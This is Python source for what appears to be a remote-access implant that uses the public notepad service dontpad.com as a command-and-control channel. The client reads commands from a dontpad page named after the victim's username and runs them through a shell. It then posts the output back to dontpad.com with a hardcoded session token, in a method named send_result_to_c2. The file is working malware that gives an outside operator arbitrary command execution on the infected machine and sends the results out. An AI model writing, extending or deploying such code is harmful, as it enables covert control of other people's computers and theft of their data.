import requests
import time
import subprocess
from observer import Observer
import getpass

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
    
    def start(self, command_body):
        if self.first_run:
            self.first_run = False
            self.send_result_to_c2()
            
        self.execute_command(command_body)

    def parse_text_dontpad(self, data):
        if "___________________" in data:
            parts = data.split("___________________", 1)
            self.command = parts[0].strip()
            self.result = parts[1].strip()
        else:
            self.command = data.strip()
            self.result = ""

    def execute_command(self, command_body):
        self.parse_text_dontpad(command_body)
        if self.command is None or self.command.lower() == "exit":
            return
        
        self.result = self.execute()
        self.send_result_to_c2()

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=20)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": self.command + "\n___________________\n\n" + self.result,
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": "-25751fc88e6e559870fd"
        }
        response = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}", data=data)
        print(f"Send result: [{response.status_code}] - {data}")


if __name__ == "__main__":
    url_with_username = f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}.body.json?lastModified=0&session-token=-25751fc88e6e559870fd"
    client = Client(url=url_with_username)
    observer = Observer(first_url="https://api.dontpad.com/yaguinhofodinha.body.json?lastModified=0&session-token=-25751fc88e6e559870fd", url_with_username=url_with_username, client=client)
    observer.start()
